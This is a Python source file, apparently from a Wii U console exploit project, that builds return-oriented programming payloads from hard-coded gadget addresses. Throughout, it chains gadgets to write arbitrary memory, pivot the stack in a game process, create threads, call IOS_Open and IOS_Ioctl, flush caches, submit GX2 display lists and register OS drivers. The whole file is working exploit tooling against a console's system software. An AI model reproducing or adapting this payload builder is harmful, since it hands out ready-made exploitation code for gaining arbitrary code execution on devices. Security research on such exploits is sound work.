import time, os, sys, socket, struct
from wiiu_rop_constants import *

def make_pm4_type3_packet_header(opcode, count):

	hdr = 0
	hdr |= (3 << 30)
	hdr |= ((count-1) << 16)
	hdr |= (opcode << 8)		

	return hdr

class WiiU_ROP_Utils(object):
	def __init__(self, words_to_init=0):
		self.rop_payload = []
		for i in range(words_to_init):
			self.rop_payload.append(0)

	def append(self, data):
		self.rop_payload.append(data)

	def pop_r3r4(self, r3=0, r4=0):
		self.rop_payload.append(0x0110C904)
		self.rop_payload.append(r3)
		self.rop_payload.append(r4)
		self.rop_payload.append(r4)
		
	def tiny_call(self, fptr, r3=0, r4=0):
		self.pop_r3r4(r3, r4)
		self.rop_payload.append(ROP_POP_R28R29R30R31)
		self.rop_payload.append(fptr)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(r4)
		self.rop_payload.append(0)
		self.rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)


	def ropgen_write_r3r4_tomem(self, outaddr):
		self.rop_payload.append(ROP_POP_R28R29R30R31)
		self.rop_payload.append(ROP_OSGetCodegenVirtAddrRange + 0x20)
		self.rop_payload.append(0)
		self.rop_payload.append(outaddr)
		self.rop_payload.append(0x10000000)
		self.rop_payload.append(0)
		self.rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)

	def write32(self, addr, value):
		self.pop_r3r4(value)
		self.ropgen_write_r3r4_tomem(addr)

	def pop_r24_to_r31(self, inputregs):

		self.rop_payload.append(ROP_POP_R24_TO_R31)
		self.rop_payload.append(0)
		self.rop_payload.append(0)

		for i in range(0, 8):
			self.rop_payload.append(inputregs[i])

		self.rop_payload.append(0)

	def call_func(self, funcaddr, r3=0, r4=0, r5=0, r6=0, r28=0):

		input_regs = 	[r6,
						r5,
						0,
						ROP_CALLR28_POP_R28_TO_R31,
						funcaddr,
						r3,
						0,
						r4]

		self.pop_r24_to_r31(input_regs)

		self.rop_payload.append(ROP_CALLFUNC)
		self.rop_payload.append(r28)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)
		self.rop_payload.append(0)

	#only works for MK8
	def StackPivot(self, new_stack):

		
		self.pop_r3r4(new_stack)

		self.rop_payload.append(0xC180000 + 0x029002ac)
		self.rop_payload.append(0x0000DEA6)
		self.rop_payload.append(0xC180000 + 0x02a645b0)

	def OSCreateThread(self, thread, entry, argc, argv, stack, stackSize, priority, attributes):

		inputregs = [1, 2, 3, 4, 5, 6, 7, 8]
		inputregs[24 - 24] = 0 # #r24
		inputregs[25 - 24] = stack # #r25 # r7
		inputregs[26 - 24] = stackSize # #r26 # r8
		inputregs[27 - 24] = priority # #r27 # r9
		inputregs[28 - 24] = thread # #r28 #r3
		inputregs[29 - 24] = entry # #r29 #r4
		inputregs[30 - 24] = argc ##r30 #r5
		inputregs[31 - 24] = argv # #r31 # r6
		self.pop_r24_to_r31(inputregs)

		self.rop_payload.append(0x020257a8 - 0xFE3C00)
		self.rop_payload.append(2) # param #10 ;r1 +8
		self.rop_payload.append(attributes << 16) # r10 ;r1 +12 (lhz from this register)
		self.rop_payload.append(0) # ;r1 +16
		self.rop_payload.append(0) # r25 ;r1 +20
		self.rop_payload.append(0) # r26 ;r1 +24
		self.rop_payload.append(0) # r27 ;r1 +28
		self.rop_payload.append(0) # r28 ;r1 +32
		self.rop_payload.append(0) # r29 ;r1 +36
		self.rop_payload.append(0) # r30 ;r1 +40
		self.rop_payload.append(0) # r31 ;r1 +44 (0x2C)
		self.rop_payload.append(0) 
	#					r3  r4 		   r5 		  r6              r7          r8					
	def IOS_Ioctl(self, fd, method_id, in_buffer, in_buffer_size, out_buffer, out_buffer_size):

		inputregs = [1, 2, 3, 4, 5, 6, 7, 8]
		inputregs[24 - 24] = 0
		inputregs[25 - 24] = fd
		inputregs[26 - 24] = method_id
		inputregs[27 - 24] = in_buffer
		inputregs[28 - 24] = in_buffer_size
		inputregs[29 - 24] = out_buffer
		inputregs[30 - 24] = out_buffer_size
		inputregs[31 - 24] = 0
		self.pop_r24_to_r31(inputregs)

		self.pop_r3r4(fd, method_id)
		self.rop_payload.append(0x02033780 - 0xFE3C00) # 0x04(r1)
		self.rop_payload.append(0) # 0x08(r1)
		self.rop_payload.append(0) # 0x0C(r1)
		self.rop_payload.append(0) # 0x10(r1)
		self.rop_payload.append(0) # 0x14(r1)
		self.rop_payload.append(0) # 0x18(r1)
		self.rop_payload.append(0) # 0x1C(r1)
		self.rop_payload.append(0) # 0x20(r1)
		self.rop_payload.append(0) # 0x24(r1)
		self.rop_payload.append(0) # 0x28(r1)
		self.rop_payload.append(0) # 0x2C(r1)
		self.rop_payload.append(0) # 0x30(r1)

	def IOS_Open(self, node_name_addr, mode):
		self.tiny_call(ROP_IOS_Open, node_name_addr, mode)

	def OSFatal(self, text_addr):
		self.tiny_call(ROP_OSFatal, text_addr)

	def DCStoreRange(self, addr, size):
		self.tiny_call(ROP_DCStoreRange, addr, size)

	def DCFlushRange(self, addr, size):
		self.tiny_call(ROP_DCFlushRange, addr, size)

	def ICInvalidateRange(self, addr, size):
		self.tiny_call(ROP_ICInvalidateRange, addr, size)

	def GX2DirectCallDisplayList(self, addr, size):
		self.tiny_call(ROP_GX2DirectCallDisplayList, addr, size)

	def GX2Flush(self):
		self.tiny_call(ROP_GX2Flush)

	def OSDriver_Register(self, name_addr, name_size):
		self.call_func(ROP_OSDriver_Register, name_addr, name_size, 0, 0)

	def OSDriver_CopyToSaveArea(self, name_addr, name_size, in_buffer, buffer_size):
		self.call_func(ROP_OSDriver_CopyToSaveArea, name_addr, name_size, in_buffer, buffer_size)

	def OSSendAppSwitchRequest(self, rampid, arg1, arg2):
		self.call_func(ROP_OSSendAppSwitchRequest, rampid, arg1, arg2)

	def memcpy(self, dest, source, size):
		self.call_func(ROP_memcpy + 4, dest, source, size)